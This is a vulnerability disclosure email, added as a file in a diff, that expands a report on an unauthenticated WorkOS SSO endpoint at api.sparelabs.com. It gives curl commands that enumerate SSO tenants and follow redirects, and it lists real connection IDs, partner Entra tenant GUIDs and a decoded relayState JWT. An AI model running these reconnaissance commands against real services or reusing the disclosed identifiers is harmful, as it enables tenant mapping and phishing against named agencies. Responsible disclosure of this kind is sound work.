@@ -1,0 +1,113 @@
+Subject: RE: Security Report — Unauthenticated Authentication-Bypass & Sensitive Credential Disclosure on api.sparelabs.com — Deep-dive addendum to Finding 2
+
+Hello Spare Labs Security Team,
+
+This is a follow-up expanding **Finding 2** (WorkOS SSO endpoint) from my report earlier today. The new material below was not part of the original submission — deeper testing on the same endpoint surfaced additional disclosures: partner Entra ID tenant GUIDs and the contents of the signed relayState JWT. I am sending this as an addendum so your team can track both under the same case.
+
+Host: api.sparelabs.com
+Endpoint: POST /v1/identity/workos/auth
+Severity: Medium (CVSS 3.1: 5.3 — AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
+Category: Authentication issue — missing authorization / information disclosure
+
+--------------------------------------------------------------------
+1. SUMMARY
+--------------------------------------------------------------------
+Beyond the client_id/connection_id disclosure already reported, the endpoint enables an unauthenticated caller to:
+- Enumerate every SSO-integrated tenant (keyed lookup confirmed via controls),
+- Walk the returned authorizationUrl to capture each partner's real Entra ID (Azure AD) tenant GUID,
+- Decode the relayState JWT embedded in that URL, disclosing internal identifiers: saml_session_id, redirect_uri, and environment_id.
+
+--------------------------------------------------------------------
+2. ADDITIONAL REPRODUCTION
+--------------------------------------------------------------------
+
+2.1 Tenant enumeration — 6 configured tenants (one command per domain, <=1 rps):
+
+for d in spare.com sparelabs.com dart.org translink.ca kingcounty.gov winnipeg.ca; do
+  curl -s -X POST -H "Content-Type: application/json" -d "{\"domain\":\"$d\"}" \
+    https://api.sparelabs.com/v1/identity/workos/auth; echo; sleep 0.7
+done
+
+Mapped results:
+
+domain          connection id                     provider
+spare.com       conn_01GRW7M1CJEJGYKMEMPBCQEZHY   SAML
+sparelabs.com   (none)                            Google OAuth
+dart.org        conn_01G03EZ4VMEJ88VENF2JE4921C   SAML
+translink.ca    conn_01KMZZAWSG4MKBT3GCJERZ84F4   SAML
+kingcounty.gov  conn_01JKRZ46KNAQRZN3J3PYTJKWAQ   SAML
+winnipeg.ca     conn_01HP76PPV8CMRJH6RYRTWEPSGS   SAML
+
+2.2 Control — keyed lookup, not input reflection:
+
+curl -s -X POST -H "Content-Type: application/json" \
+  -d '{"domain":"toronto.ca"}' https://api.sparelabs.com/v1/identity/workos/auth
+
+-> {"name":"NotFoundError","message":"Other was not found",...}
+
+Same 404 for 13 control domains total (including 11 public Spare marketing partners from
+spare.com/customer-stories) — confirming this is a keyed tenant-directory lookup, not an
+open redirect or content injection.
+
+2.3 Redirect hop — partner Entra tenant GUID:
+
+U=$(curl -s -X POST -H "Content-Type: application/json" -d '{"domain":"dart.org"}' \
+  https://api.sparelabs.com/v1/identity/workos/auth | python3 -c 'import sys,json;print(json.load(sys.stdin)["authorizationUrl"])')
+curl -s -o /dev/null -w "%{redirect_url}\n" -G "$U"
+
+-> https://login.microsoftonline.com/4bdf4200-8d79-408b-940d-bdc4a1c9bfaa/saml2?SamlRequest=...&RelayState=<JWT>
+
+Also confirmed:
+  kingcounty.gov -> login.microsoftonline.com/bae5059a-76f0-49d7-9996-72dfe95d69c7
+  translink.ca   -> login.microsoftonline.com/4157b39d-533a-41f7-8314-898c4d2ff33b
+
+2.4 Decoded relayState JWT payload:
+
+{
+  "api": "sso",
+  "redirect_uri": "https://platform.sparelabs.com/workos/callback",
+  "state": "",
+  "saml_session_id": "saml_session_01M0CMJ6WTPH6KE34D6XVCXF4H",
+  "from_portal": false,
+  "from": "api",
+  "environment_id": "environment_01F5KHYX2HK6MTC68CHR2WGHDC",
+  "iat": 1787130616
+}
+
+Note: the JWT is signed but its payload is readable by design to anyone holding the URL.
+environment_id alone distinguishes deployments without any additional requests.
+
+--------------------------------------------------------------------
+3. IMPACT (honest assessment)
+--------------------------------------------------------------------
+Disclosed WITHOUT authentication, demonstrated above:
+- Internal WorkOS client_id + per-tenant connection IDs
+- Partner Entra ID tenant GUIDs (via first redirect hop)
+- Internal deployment identifiers (environment_id, saml_session_id, callback path)
+- Complete map of which agencies use SAML vs Google OAuth
+
+NOT demonstrated / not claimed: account takeover, session theft, credential access,
+code execution, or access to any third-party account data. The platform callback
+(platform.sparelabs.com/workos/callback) correctly rejects unauthenticated requests
+(401 InvalidTokenError). Phishing potential of minted genuine login URLs is noted as
+context only, consistent with the original report.
+
+--------------------------------------------------------------------
+4. REMEDIATION ADDENDUM
+--------------------------------------------------------------------
+In addition to the fixes in the original report:
+- Treat Entra tenant GUIDs and relayState JWT contents as sensitive; the authorization
+  flow should not require the client to traverse a URL that embeds them where avoidable
+  (WorkOS supports server-side handling of the redirect chain).
+- Consider opaque, single-use handles in place of structured JWTs in RelayState.
+
+--------------------------------------------------------------------
+5. TEST HYGIENE
+--------------------------------------------------------------------
+Read-only GET/POST requests against api.sparelabs.com only; no accounts created, no
+data modified, no login flows completed, manual testing at <=1 rps per program rules.
+Probe domains were Spare-owned, partners' own public domains, or dummy controls.
+
+Best regards,
+Ritesh Ekbote
+riteshekbote@gmail.com
